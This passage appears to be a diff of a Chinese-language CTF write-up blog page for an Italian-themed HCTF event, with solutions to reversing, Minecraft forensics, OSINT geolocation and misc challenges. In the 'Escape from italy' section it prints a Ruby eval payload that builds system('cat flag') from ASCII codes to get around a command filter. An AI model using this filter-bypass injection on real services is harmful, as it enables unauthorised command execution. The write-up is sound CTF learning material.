&#x27;https://youtu.be/XH0CSzdHwg0?si=DOwRhOnorrc-WWIx&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FLAG: <code>hctf&#123;z4gg30_15_gu3_j0eq_!&#125;</code></p>
+</blockquote>
+<h2 id="Thesecondhorseman"><a href="#Thesecondhorseman" class="headerlink" title="Thesecondhorseman"></a>Thesecondhorseman</h2><blockquote>
+<p>[name&#x3D;FlyDragon]</p>
+</blockquote>
+<p>把判斷 patch 掉就好，忘記留原始檔案ㄌQQ</p>
+<blockquote>
+<p>FLAG: <code>hctf&#123;www.youtube.com/watch?v=hnBuaJDNagU&#125;</code></p>
+</blockquote>
+<h2 id="Thefinalhorseman"><a href="#Thefinalhorseman" class="headerlink" title="Thefinalhorseman"></a>Thefinalhorseman</h2><blockquote>
+<p>[name&#x3D;FlyDragon]</p>
+</blockquote>
+<p>輸出的方式是 flag 拆成很多個 function，直接去偷</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkwBAjILp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkwBAjILp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<blockquote>
+<p>FLAG: <code>hctf&#123;https://youtu.be/vXejrAXXmkU&#125;</code></p>
+</blockquote>
+<h2 id="Una-quotidiana-guerra"><a href="#Una-quotidiana-guerra" class="headerlink" title="Una quotidiana guerra"></a>Una quotidiana guerra</h2><p>給了一個滿滿毒瘤<code>#define</code>的怪異source code：  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> tu int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dimmi </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> come </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mai </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kilometri </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> melodia </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sus </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inutile </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inutilestimai </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> qui </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> seduto </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> notti </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> alla </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sento </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sogno </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pregando </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> non </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> scrivere </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ma </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> casa </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vedere </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dove </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vai </span></span><br><span class="line">notti quotidiana inutile inutilestimai alla <span class="string">&quot;abcdefghijklmnopqrstuvwxyz.:_-=/&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>  sus</span><br><span class="line">notti guerra inutile inutilestimai alla <span class="string">&quot;HDVIC8tq8&#125;Es/&#123;-&#125;JOPJAHHJQ.=Y5rAHJWEtRgSc&quot;</span> sus  </span><br><span class="line">tu stanza come notti finiscono mai qui</span><br><span class="line">sogno come tu i alla <span class="number">0</span> sus i non pregando come quotidiana mai sus i scrivere mai qui</span><br><span class="line">ma come finiscono casa quotidiana inutile i inutilestimai mai qui</span><br><span class="line">melodia i sus</span><br><span class="line">seduto seduto</span><br><span class="line">melodia <span class="number">0</span> sus seduto </span><br><span class="line">sento bambino come mai qui</span><br><span class="line">sogno come tu i alla <span class="number">0</span> sus i non pregando come guerra mai sus i scrivere mai qui</span><br><span class="line">guerra inutile i inutilestimai alla quotidiana inutile come stanza come guerra inutile i inutilestimai mai vedere pregando come quotidiana mai dove i mai  vai pregando come quotidiana mai inutilestimai sus seduto</span><br><span class="line">kilometri come <span class="string">&quot;%s\n&quot;</span>, guerra mai sus seduto</span><br><span class="line">tu dimmi come mai qui</span><br><span class="line">kilometri come <span class="string">&quot;Kilometri di kilometri di kilometri di kilometri\n&quot;</span> mai sus</span><br><span class="line">bambino come mai sus</span><br><span class="line">melodia <span class="number">0</span> sus seduto</span><br></pre></td></tr></table></figure>
+<p>大概可以通靈一下之後發現結尾的sus是分號，一開始定義charset的<code>notti</code>是char，然後緊接著的<code>inutile inutilestimai alla </code>分別應該是<code>[]=</code>，再從sus和0的出現位置猜測有for迴圈，<code>sogno come tu i alla 0</code>是<code>for(int i=0</code>等等的，即可還原程式碼。<br>還原結果：<br>(中間有改一些東西因為本來flag只會跑到一半qq)  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> quotidiana [ ] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz.:_-=/&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>  ;</span><br><span class="line"><span class="type">char</span> guerra [ ] = <span class="string">&quot;HDVIC8tq8&#125;Es/&#123;-&#125;JOPJAHHJQ.=Y5rAHJWEtRgSc&quot;</span> ;</span><br><span class="line"><span class="type">int</span> <span class="title function_">stanza</span> <span class="params">( <span class="type">char</span> finiscono )</span> &#123;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="built_in">strlen</span> ( quotidiana ) ; i ++ ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( finiscono == quotidiana [ i ] ) &#123;</span><br><span class="line"><span class="keyword">return</span> i ;</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> ; &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">bambino</span> <span class="params">( )</span> &#123;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="built_in">strlen</span> ( guerra ) ; i ++ ) &#123;</span><br><span class="line">guerra [ i ] = quotidiana [ ( stanza ( guerra [ i ] ) + <span class="built_in">strlen</span> ( quotidiana ) - i )  % <span class="built_in">strlen</span> ( quotidiana ) ] ; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span> ( <span class="string">&quot;%s\n&quot;</span>, guerra ) ; &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">( )</span> &#123;</span><br><span class="line"><span class="built_in">printf</span> ( <span class="string">&quot;Kilometri di kilometri di kilometri di kilometri\n&quot;</span> ) ;</span><br><span class="line">bambino ( ) ;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> ; &#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="The-Enzo’s-piece"><a href="#The-Enzo’s-piece" class="headerlink" title="The Enzo’s piece"></a>The Enzo’s piece</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>他給了你一個Minecraft地圖檔，並且提敘說有人身體不好，然後他在那個位置有留下東西，所以我猜測他應該是要想辦法查出那個玩家的上次死亡座標。<br>如果要查到其他玩家上次的死亡座標的話可以使用<code>NBTExplorer</code><br><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/nbtexplorer.mirror/">https://sourceforge.net/projects/nbtexplorer.mirror/</a></p>
+<p>你可以對該地圖檔進行操作，其中包括可以在<code>playerdata</code>中找到最新一次的死亡位置<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByHIr0WL6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByHIr0WL6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>位置在<code>-1122 52 -340</code></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HkERBCWLa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkERBCWLa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>直接走過去就可以拿到flag了<br><div class="img-item" data-src="https://hackmd.io/_uploads/HknxP0ZU6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HknxP0ZU6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><strong>這題我那時候用tp會讓告示牌被破壞，所以我是用走的，另外記得要開1.20.2</strong></p>
+<blockquote>
+<p>FLAG : HCTF{Th3_On3_P13c3_Is_R34l!!!}</p>
+</blockquote>
+<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="Why-Not-Naples"><a href="#Why-Not-Naples" class="headerlink" title="Why Not?(Naples)"></a>Why Not?(Naples)</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>他給了一個影片要我找這是哪間hotel<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ugzma5lx910">https://www.youtube.com/watch?v=ugzma5lx910</a><br>透過他的影片跟提敘發現有3個線索，分別是Justin Bieber、Napoli跟這部影片 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=o9nrxDeUss4&t=428s">https://www.youtube.com/watch?v=o9nrxDeUss4&amp;t=428s</a></p>
+<p>之後我查到了新聞發現他在Grand Hotel Vesuvio。<br>另外也可以透過線索的影片找到他的名字<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByL3iRW8T.jpg" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByL3iRW8T.jpg" alt="未命名"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">未命名</span></div></div></p>
+<blockquote>
+<p>FLAG : hctf{Grand_Hotel_Vesuvio}</p>
+</blockquote>
+<h2 id="Italian-mails-Origins"><a href="#Italian-mails-Origins" class="headerlink" title="Italian mails(Origins)"></a>Italian mails(Origins)</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>這題給了一個影片，要我找到這條街的名字<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=rNta7FLxq8s">https://www.youtube.com/watch?v=rNta7FLxq8s</a></p>
+<p>從中可以看到一個蠻明顯的線索<code>post italiane</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/HJOuhCZ8a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJOuhCZ8a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>並且我嘗試尋找其他影片-&gt;關鍵字:Enzo Tommasi<br>找到了他在<code>Ostia</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/SkL7T0Z86.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkL7T0Z86.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>最後用google map 尋找Ostia的post italiane，用街景最終確定在Via Ferdinando Acton 44<br><div class="img-item" data-src="https://hackmd.io/_uploads/r1qaaCb8a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1qaaCb8a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<blockquote>
+<p>FLAG : hctf{Via_Ferdinando_Acton_44}</p>
+</blockquote>
+<h2 id="The-meninges"><a href="#The-meninges" class="headerlink" title="The meninges"></a>The meninges</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<blockquote>
+<p>Flag : hctf{Viale_della_Stella_Polare}</p>
+</blockquote>
+<h2 id="Telecamere"><a href="#Telecamere" class="headerlink" title="Telecamere?"></a>Telecamere?</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<blockquote>
+<p>Flag : hctf{Via_San_Biagio_di_Val_Polcevera_Genova}</p>
+</blockquote>
+<h2 id="The-third-horseman"><a href="#The-third-horseman" class="headerlink" title="The third horseman"></a>The third horseman</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<blockquote>
+<p>Flag : </p>
+</blockquote>
+<h2 id="Sunkissed-Enzo"><a href="#Sunkissed-Enzo" class="headerlink" title="Sunkissed Enzo"></a>Sunkissed Enzo</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<blockquote>
+<p>Flag : hctf{via_della_tolda}</p>
+</blockquote>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Ghost-Image"><a href="#Ghost-Image" class="headerlink" title="Ghost Image"></a>Ghost Image</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>直接將他給的兩層CSS調透明度疊圖就可以看到flag了<br><div class="img-item" data-src="https://hackmd.io/_uploads/BkXS_3aLp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkXS_3aLp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Hy84d0bL6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hy84d0bL6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<blockquote>
+<p>Flag : HCTF{M4MMAMIA_SO_M4NY_SHADOW8OXES_IN_TH1S_CSS}</p>
+</blockquote>
+<h2 id="Escape-from-italy"><a href="#Escape-from-italy" class="headerlink" title="Escape from italy"></a>Escape from italy</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>嘗試去看flag.txt他叫我們去讀key，去讀key後發現他輸出key是guera，然後她告訴我有東西在port 8889，所以我嘗試連過去<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByrRd2TLp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByrRd2TLp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>首先他要我們輸入key，之後可以輸入command，但很多東西都被過濾掉了，所以我嘗試測試有哪些是可以用的</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJNvuCbLp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJNvuCbLp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>最後發現可以用eval、數字、以及一些符號，所以我嘗試去研究ruby的一些特性(因為報錯是ruby的)，後來發現&lt;&lt;可以用來連接字串，且將數字寫入到字串會轉ASCII<br>最後我的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;&#x27;&lt;&lt;115&lt;&lt;121&lt;&lt;115&lt;&lt;116&lt;&lt;101&lt;&lt;109&lt;&lt;40&lt;&lt;39&lt;&lt;99&lt;&lt;97&lt;&lt;116&lt;&lt;32&lt;&lt;102&lt;&lt;108&lt;&lt;97&lt;&lt;103&lt;&lt;39&lt;&lt;41)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Flag : HCTF{1s_d1z_r34l1ty_0r_F1c710n?}</p>
+</blockquote>
+<h2 id="Cornetto-Compression"><a href="#Cornetto-Compression" class="headerlink" title="Cornetto Compression"></a>Cornetto Compression</h2><blockquote>
+<p>[name&#x3D;naup96321]</p>
+</blockquote>
+<p>根據他的範例我知道了他用了特殊的方法將所有圖片疊成一張，只要使用stegonline就可以一張一張的分離出來，最後拼在一起就是<br><div class="img-item" data-src="https://hackmd.io/_uploads/S1qzuC-UT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1qzuC-UT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<blockquote>
+<p>Flag : HCTF{W3LL_DONE_M4TE_C1CCI0G4M3R_IS_PROUD_0F_YOU_N3XT_TIM3_BRING_M3_A_CORNETO_WITH_NUTELL4}</p>
+</blockquote>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+                <li class="previous page-item d-inline"><a href="/2024/02/29/Cake-CTF-2023-WP/" class="page-link float-left">&larr;  Newer</a></li>
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/02/29/sun-shine-CTF-WP/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
